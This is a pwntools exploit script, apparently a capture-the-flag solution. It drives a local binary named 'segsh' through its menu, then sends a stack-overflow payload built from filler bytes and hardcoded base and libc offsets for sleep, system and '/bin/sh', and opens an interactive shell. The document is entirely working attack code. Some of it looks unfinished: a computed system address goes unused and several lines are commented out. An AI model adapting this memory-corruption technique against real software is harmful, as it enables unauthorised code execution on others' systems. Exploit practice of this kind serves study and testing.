from pwn import *

p = process (["./segsh", "10000"])

log.info (p.recvuntil ("__"))
p.sendline ("install -i echo")

log.info (p.recvuntil ("__"))
p.sendline ("exec -e echo")

log.info (p.recvuntil ("string: "))

base = 0x555a3000

sleep_offset = 0xb5500
system_offset = 0x40190
binsh_offset = 0x160a24

sleep_addr = base + sleep_offset
system_addr = base + system_offset
binsh_addr = base + binsh_offset

payload = "0" * (0x3f8)
payload += p32 (0xdeadbeef)
#payload += p32 (0x4d)
payload += p32 (0)

#payload += p32 (sleep_addr)
#payload += p32 (0xdeadbeef)
payload += p32 (binsh_addr)

payload += p32 (0x1000)

p.send (payload)


#p.sendline ("ls")

p.interactive ()

"""
for i in range (5):
  log.info (p.recvline (timeout = 1))
"""

p.close ()
